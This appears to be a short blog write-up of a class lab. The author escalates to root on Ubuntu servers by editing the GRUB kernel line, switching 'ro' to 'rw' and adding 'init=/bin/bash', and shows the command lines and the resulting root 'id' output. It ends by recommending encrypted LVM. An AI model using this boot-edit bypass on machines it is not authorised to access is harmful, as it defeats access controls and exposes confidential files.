---
title: "Fastest Privesc on Grub"
description: "Imagine a world without encrypted LVM"
authors: ["FreezingKas"]
publish_date: "2022-12-13"
tags : ["System", "Privesc"]
---
# Fastest Privesc on Grub 
## Context

During Networking Security class, i had a lab with seven servers on a Proxmox created by our teacher without a root user.

After reporting all privilege escalations with `sudo` commands, my teacher decided to disable all the `sudo` commands until he could find a solution.

Unfortunately, it was not enough.

## Privesc

Grub is a boot loader that allows you to choose which operating system to boot.

It was installed on the servers, and I could edit startup scripts :

```bash
recordfail
load_video
gfxmode $linux_gfx_mode
insmod gzio
if [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fi
insmod part_gpt
insmod ext2
search --no-floppy --fs-uuid --set=root <UUID>
linux /boot/vmlinuz-5.15.0-56-generic root=UUID=<UUID> ro quiet splash $vt_handoff
initrd /boot/initrd.img-5.15.0-56-generic
```

In our case, the LVM was not encrypted, so we could access files by spawning a root shell :

```bash
linux /boot/vmlinuz-5.15.0-56-generic root=UUID=<UUID> ro quiet splash $vt_handoff
```

Just change `ro` (read_only) to `rw` (read-write) and add init=/bin/bash at the end of the line, then reboot the server.

```bash
linux /boot/vmlinuz-5.15.0-56-generic root=UUID=<UUID> rw quiet splash $vt_handoff init=/bin/bash
```

We can now access the root user.

```bash
root@(none):/$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

Please encrypt your LVMs. Imagine it was not a lab, but an enterprise laptop with confidential documents.
When you encrypt LVM you can't read files when changing `ro` to `rw` in the grub file, passphrase is required.
